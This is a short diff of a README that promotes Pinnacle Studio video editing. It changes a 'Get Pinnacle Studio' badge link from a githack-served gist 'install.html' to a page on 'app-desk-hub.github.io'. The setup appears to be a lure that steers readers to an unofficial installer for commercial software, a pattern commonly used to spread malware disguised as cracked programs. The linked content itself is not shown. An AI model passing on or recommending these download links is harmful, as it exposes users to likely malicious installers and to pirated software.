@@ -2,7 +2,7 @@
 
 Pinnacle Studio brings professional-grade video editing to creators who demand **speed, control, and cinematic quality**. With advanced timeline tools, color grading, and motion tracking, it’s perfect for storytelling that stands out. 🎞️  
 
-[![🟣 Get GitHub Instruction](https://img.shields.io/badge/🟣%20Get%20Pinnacle%20Studio-673AB7?style=for-the-badge&logo=pinnacle&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/briananacondapage/41e63a92fb1eddb1da176cc350663a50/raw/6a4b9d8f2f1363d6a9a05de39608dee959cfdfb5/install.html?offer=PinnacleStudio)
+[![🟣 Get GitHub Instruction](https://img.shields.io/badge/🟣%20Get%20Pinnacle%20Studio-673AB7?style=for-the-badge&logo=pinnacle&logoColor=white&labelColor=0B0F19)](https://app-desk-hub.github.io/.github/?offer=PinnacleStudio)
 
 ---
 
